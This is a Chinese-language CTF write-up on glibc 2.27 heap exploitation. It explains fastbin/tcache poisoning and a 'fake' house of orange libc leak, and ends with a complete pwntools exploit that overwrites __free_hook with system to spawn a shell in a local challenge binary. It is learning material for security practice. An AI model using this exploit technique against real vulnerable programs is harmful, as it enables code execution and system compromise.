# 知识点
- fastbin attack
- "fake" house of orange

# 收获
- gdb 源码级调试glibc
- house of orange 基本原理
## gdb 源码级调试
下载所需版本的glibc源码
```shell
sudo apt-get install libc6-dbg
sudo apt-get install glibc-source
cd /usr/src/glibc
sudo tar xvf glibc-x.xx.tar.xz
```
在gdb中使用:
```shell
dir /usr/src/glibc/glibc-x.xx/malloc
```
即可开始调试。
## house of orange 基本原理及在本题中的应用
house of orange简单来说就是利用溢出或者任意地址写的前置漏洞来修改topchunk的size字段，将其改小，从而可以通过若干次malloc来竭尽topchunk的空间，迫使ptmalloc将不足以满足用户需求的topchunk free到unsorted bin中。
这里之所以要改小topchunk的size而不是直接malloc一个超大的块，是因为如果申请的堆块大小超过了128k，ptmalloc就会调用mmap来申请内存，而不是brk，这样就不能影响到topchunk了。
修改topchunk的size有四个限制：
1.	伪造的 size 必须要对齐到内存页

2.	size 要大于 MIN_CHUNK_SIZE(0x10)

3.	size 要小于之后申请的 chunk size + MIN_CHUNK_SIZE(0x10)

4.	size 的 prev inuse 位必须为 1

这样的手法主要用于
- 不能调用free函数的情况（它能够触发free(topchunk)）；
- 不能通过常规方式泄露libc地址的情况（如本题）。

本题的关键难点在于如何泄露libc地址。由于题目限制，无法通过malloc和free将堆块放到unsorted bin这样的双向链表中。
通过上述的house of orange 似乎可以方便地泄露libc地址，
通过学习和调试，了解了glibc-2.27在topchunk大小无法满足用户申请的内存大小后：
1. 先调用`malloc_consolidate`,将内存中相邻的、已经被free的堆块都合并，放在unsorted bin中；
2. 判断unsored bin 中的块是否符合用户需求，如不符合，将该块放入对应大小的bin中，（本题中是small bin，符合unsorted bin 的逻辑)
3. topchunk此时的大小还是不足，但是可能是由于smallbin里面有没被使用的内存块，且大小足够大，因此ptmalloc没有调用sysmalloc从系统申请新的topchunk，而是从smallbin里取出那块内存进行分割，剩余部分存放在unsorted bin，并且在last_remainder中也有地址记录。
4. 上一步中存放在unsorted bin中的块在本题中可以被利用来泄露libc地址。
# exp
```python
from pwn import *
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = "debug"
io = process("./pwn")#,env={"LD_PRELOAD":"./libc.so.6"}
def add(idx,size,content):
    io.sendline("1")
    io.recvuntil("index\n")
    io.sendline(str(idx))
    io.recvuntil("size\n")
    io.sendline(str(size))
    io.recvuntil("something\n")
    io.sendline(content)
    io.recvuntil("gift :")
    heap_addr = io.recvline()
    return heap_addr
def remove(idx):
    io.sendline("2")
    io.recvuntil("index")
    io.sendline(str(idx))

heap_addr = int(add(0,0x50,"/bin/sh\x00"),16)
add(1, 0x48, 'aaa\x80bbb')

top_addr = heap_addr + 160

remove(0)
remove(0)
remove(0)
add(2, 0x50, p64(top_addr)*2)
add(3, 0x50, p64(top_addr)*2)
add(4, 0x50, p64(0xf1)*2)

for i in range(8):
    remove(1)
for i in range(8):
    remove(0)

add(5, 0x78, 'aaa\x80bbb')
gdb.attach(io)
add(6, 0x78, 'aaa\x80bbb')
add(7,0x48,'emmm')

libc_base = int(add(8,0x48,p64(top_addr)*2),16)- 4111520
#libc_base = int(add(8,0x48,"123456"),16)- 4111520 #???????? this add modify top chunk addr ??
libc = ELF("./mlibc")
system_addr = libc_base + libc.symbols["system"]
free_hook = libc_base + libc.symbols["__free_hook"]
print("[+]system addr:0x%x"%system_addr)
print("[+]free_hook addr:0x%x"%free_hook)

remove(0)
remove(0)
remove(0)

add(9,0x50,p64(free_hook)*2)
add(10,0x50,p64(free_hook)*2)
add(11,0x50,p64(system_addr))
add(12,0x30,"/bin/sh\x00")
remove(12)
io.interactive()

```

# 待解决
1. 为什么`libc_base = int(add(8,0x48,"12345"),16)- 4111520`会修改topchunk的指针？